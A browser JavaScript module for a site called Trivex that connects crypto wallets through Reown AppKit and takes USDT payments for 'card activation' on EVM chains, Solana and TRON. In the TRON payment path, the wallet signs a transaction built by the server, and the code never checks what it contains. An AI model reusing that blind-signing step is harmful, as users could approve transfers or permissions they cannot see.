/* Trivex — one wallet layer for every chain, built on Reown AppKit.

   AppKit is WalletConnect's own SDK: one modal that lists 600+ wallets,
   handles QR on desktop, deep-links straight into the wallet app on mobile,
   and brings it back to the foreground for each approval. It covers EVM,
   TRON and Solana, so the page no longer needs per-wallet code paths.

   Note on networks: the `tron` export is an EVM-compatible definition —
   TRON signing needs `tronMainnet`, whose namespace is actually `tron`. */

(function () {
  const PROJECT_ID = 'dff67a76430e884635ae5d3c113e1c05';
  const CDN = 'https://esm.sh';
  const DEPS = '?bundle&deps=@noble/hashes@1.8.0';

  const NET_FOR_CHAIN = {
    tron: 'tronMainnet',
    solana: 'solana',
    ethereum: 'mainnet',
    bsc: 'bsc',
    polygon: 'polygon',
    arbitrum: 'arbitrum',
    base: 'base',
    optimism: 'optimism',
    avalanche: 'avalanche'
  };

  let mods = null, kit = null, initPromise = null;

  async function load() {
    if (mods) return mods;
    const [ak, nets, eth, sol, tron] = await Promise.all([
      import(`${CDN}/@reown/appkit@1${DEPS}`),
      import(`${CDN}/@reown/appkit@1/networks${DEPS}`),
      import(`${CDN}/@reown/appkit-adapter-ethers@1${DEPS}`),
      import(`${CDN}/@reown/appkit-adapter-solana@1${DEPS}`),
      import(`${CDN}/@reown/appkit-adapter-tron@1${DEPS}`)
    ]);
    mods = { ak, nets, eth, sol, tron };
    return mods;
  }

  async function init() {
    if (kit) return kit;
    if (initPromise) return initPromise;
    initPromise = (async () => {
      const m = await load();
      const names = [...new Set(Object.values(NET_FOR_CHAIN))];
      const networks = names.map(n => m.nets[n]).filter(Boolean);
      kit = m.ak.createAppKit({
        adapters: [new m.eth.EthersAdapter(), new m.sol.SolanaAdapter(), new m.tron.TronAdapter()],
        networks,
        projectId: PROJECT_ID,
        metadata: {
          name: 'Trivex',
          description: 'USDT card activation',
          url: location.origin,
          icons: [location.origin + '/icon.png']
        },
        features: { analytics: false, email: false, socials: false, swaps: false, onramp: false }
      });
      return kit;
    })();
    return initPromise;
  }

  function netFor(chainId) {
    const key = NET_FOR_CHAIN[chainId];
    return key && mods ? mods.nets[key] : null;
  }

  const sleep = ms => new Promise(r => setTimeout(r, ms));

  function addressFor(ns) {
    try {
      if (typeof kit.getAddressByChainNamespace === 'function') {
        return kit.getAddressByChainNamespace(ns) || null;
      }
      return kit.getAddress() || null;
    } catch { return null; }
  }

  window.TrivexKit = {
    available: true,

    /* opens the wallet modal and resolves with the address on that chain */
    async connect(chainId, { timeoutMs = 180000 } = {}) {
      const k = await init();
      const net = netFor(chainId);
      if (!net) throw new Error('unsupported_chain');
      const ns = net.chainNamespace;

      const already = addressFor(ns);
      if (already) {
        try { await k.switchNetwork(net); } catch { /* already there */ }
        return already;
      }

      try { await k.switchNetwork(net); } catch { /* set on connect instead */ }
      await k.open();

      const deadline = Date.now() + timeoutMs;
      while (Date.now() < deadline) {
        const addr = addressFor(ns);
        if (addr) { try { k.close(); } catch { /* noop */ } return addr; }
        await sleep(400);
      }
      throw new Error('connect_timeout');
    },

    async disconnect() {
      if (!kit) return;
      try { await kit.disconnect(); } catch { /* noop */ }
    },

    /* the wallet renders this text on its approval screen */
    async signMessage(chainId, message, address) {
      const k = await init();
      const net = netFor(chainId);
      const ns = net.chainNamespace;
      const provider = k.getProvider(ns);
      if (!provider) throw new Error('no_provider');

      if (ns === 'eip155') {
        const hex = '0x' + Array.from(new TextEncoder().encode(message))
          .map(b => b.toString(16).padStart(2, '0')).join('');
        return provider.request({ method: 'personal_sign', params: [hex, address] });
      }
      if (ns === 'solana') {
        const sig = await provider.signMessage(new TextEncoder().encode(message));
        return typeof sig === 'string' ? sig : 'signed';
      }
      // TRON wallets expose either a direct method or the WalletConnect one
      if (typeof provider.signMessage === 'function') {
        return provider.signMessage(message);
      }
      return provider.request({
        method: 'tron_signMessage',
        params: { address, message }
      });
    },

    /* returns the transaction id of the USDT transfer */
    async pay(chainId, { from, to, amountUnits, tier }) {
      const k = await init();
      const net = netFor(chainId);
      const ns = net.chainNamespace;
      const provider = k.getProvider(ns);
      if (!provider) throw new Error('no_provider');

      if (ns === 'eip155') {
        const data = '0xa9059cbb' +
          to.toLowerCase().replace(/^0x/, '').padStart(64, '0') +
          BigInt(amountUnits).toString(16).padStart(64, '0');
        return provider.request({
          method: 'eth_sendTransaction',
          params: [{ from, to: netTokenOf(chainId), data, value: '0x0' }]
        });
      }

      if (ns === 'tron') {
        // built and broadcast by the backend; the wallet only signs
        const built = await fetch('/api/tron-tx?action=build', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ from, tier })
        }).then(r => r.json());
        if (!built.ok) throw new Error(built.error || 'build_failed');

        const signed = typeof provider.signTransaction === 'function'
          ? await provider.signTransaction(built.transaction)
          : await provider.request({ method: 'tron_signTransaction', params: { address: from, transaction: built.transaction } });
        if (!signed) throw new Error('not_signed');

        const sent = await fetch('/api/tron-tx?action=broadcast', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ transaction: signed.result || signed })
        }).then(r => r.json());
        if (!sent.ok) throw new Error(sent.error || 'broadcast_failed');
        return sent.txid;
      }

      throw new Error('chain_pay_unsupported');   // Solana falls back to auto-detect
    }
  };

  /* token contract for the active chain, supplied by the page */
  function netTokenOf(chainId) {
    const c = (window.PAYCFG_CHAINS || []).find(x => x.id === chainId);
    if (!c) throw new Error('no_chain_config');
    return c.token;
  }

  /* warm the SDK up so the first tap opens instantly */
  if ('requestIdleCallback' in window) requestIdleCallback(() => load().catch(() => {}));
  else setTimeout(() => load().catch(() => {}), 2000);
})();
